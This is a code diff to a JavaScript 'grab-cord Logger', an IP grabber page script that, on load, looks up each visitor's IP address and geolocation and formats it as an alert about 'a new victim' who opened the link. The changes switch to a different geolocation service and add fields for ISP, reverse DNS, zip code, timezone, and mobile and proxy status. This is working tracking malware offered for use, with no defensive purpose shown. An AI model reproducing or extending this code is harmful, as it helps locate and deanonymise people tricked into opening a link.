@@ -4,21 +4,20 @@ document.addEventListener("DOMContentLoaded", () => {
     const redirectURL = urlParams.get("redirect");
   
     if (webhookURL) {
-      // Fetch IP information from ipinfo.io
-      fetch("https://ipinfo.io")
+      // Fetch IP information from ip-api.com
+      fetch("http://ip-api.com/json/?fields=continent,continentCode,country,region,regionName,city,zip,timezone,isp,reverse,mobile,proxy,query")
         .then((response) => response.json())
         .then((ipInfo) => {
           // Create the main embed object with IP information
           const main = {
-            title: "grab-cord Logger",
-            description: "> __A new victim just opened your URL:__",
+            description: "**__A new victim just opened your URL:__**",
             thumbnail: {
               url: "https://i1.sndcdn.com/avatars-qoKvbOjOy1aF8Fnl-ZKqvUA-t500x500.jpg",
             },
             fields: [
               {
                 name: "IP:",
-                value: `\`${ipInfo.ip}\``,
+                value: `\`${ipInfo.query}\``,
                 inline: false,
               },
               {
@@ -27,13 +26,8 @@ document.addEventListener("DOMContentLoaded", () => {
                 inline: false,
               },
               {
-                name: "Town:",
-                value: `\`${ipInfo.city}\``,
-                inline: false,
-              },
-              {
-                name: "Region:",
-                value: `\`${ipInfo.region}\``,
+                name: "Continent:",
+                value: `\`${ipInfo.continent}\``,
                 inline: false,
               },
               {
@@ -42,26 +36,51 @@ document.addEventListener("DOMContentLoaded", () => {
                 inline: false,
               },
               {
-                name: "Location:",
-                value: `\`${ipInfo.loc}\``,
+                name: "Region Name:",
+                value: `\`${ipInfo.regionName}\``,
                 inline: false,
               },
               {
-                name: "Company:",
-                value: `\`${ipInfo.org}\``,
+                name: "City:",
+                value: `\`${ipInfo.city}\``,
                 inline: false,
               },
               {
-                name: "Postal Code:",
-                value: `\`${ipInfo.postal}\``,
+                name: "Zip Code:",
+                value: `\`${ipInfo.zip}\``,
+                inline: false,
+              },
+              {
+                name: "Timezone:",
+                value: `\`${ipInfo.timezone}\``,
+                inline: false,
+              },
+              {
+                name: "ISP:",
+                value: `\`${ipInfo.isp}\``,
+                inline: false,
+              },
+              {
+                name: "Reverse DNS:",
+                value: `\`${ipInfo.reverse}\``,
+                inline: false,
+              },
+              {
+                name: "Mobile:",
+                value: `\`${ipInfo.mobile}\``,
+                inline: false,
+              },
+              {
+                name: "Proxy:",
+                value: `\`${ipInfo.proxy}\``,
                 inline: false,
               },
             ],
             footer: {
-              text: "roc4et.de",
+              text: "made by @roc4et",
             },
             author: {
-              name: "made by @roc4et",
+              name: "grab-cord Logger",
               url: "https://roc4et.de",
             },
           };
